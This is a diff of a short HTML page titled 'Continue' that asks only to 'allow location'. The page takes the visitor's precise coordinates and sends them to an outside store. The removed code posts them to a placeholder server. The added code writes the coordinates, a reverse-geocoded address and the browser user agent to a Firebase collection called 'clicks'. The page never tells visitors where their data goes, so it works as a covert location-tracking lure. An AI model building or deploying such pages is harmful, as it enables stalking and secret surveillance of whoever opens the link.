@@ -1,46 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Location Verification</title>
+  <title>Continue</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
-  <h2>Tap to continue</h2>
-  <p>Please allow location access</p>
+  <h3>Please allow location</h3>
 
-  <script>
-    window.onload = () => {
-      if (!navigator.geolocation) {
-        alert("Geolocation not supported");
-        return;
-      }
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-      navigator.geolocation.getCurrentPosition(
-        success,
-        error,
-        { enableHighAccuracy: true }
-      );
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_PROJECT.firebaseapp.com",
+      projectId: "YOUR_PROJECT",
     };
 
-    function success(position) {
-      const data = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        accuracy: position.coords.accuracy,
-        time: new Date().toISOString()
-      };
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
 
-      fetch("https://yourserver.com/save.php", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
+    if (!navigator.geolocation) {
+      alert("Geolocation not supported");
+    } else {
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
 
-      document.body.innerHTML = "<h3>Thank you</h3>";
-    }
+        // Reverse geocoding
+        const geo = await fetch(
+          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
+        ).then(r => r.json());
 
-    function error() {
-      alert("Location permission denied");
+        await addDoc(collection(db, "clicks"), {
+          latitude: lat,
+          longitude: lon,
+          address: geo.display_name || "Unknown",
+          userAgent: navigator.userAgent,
+          time: new Date().toISOString()
+        });
+
+        document.body.innerHTML = "<h2>Thank you</h2>";
+      },
+      () => alert("Location permission denied"));
     }
   </script>
 </body>
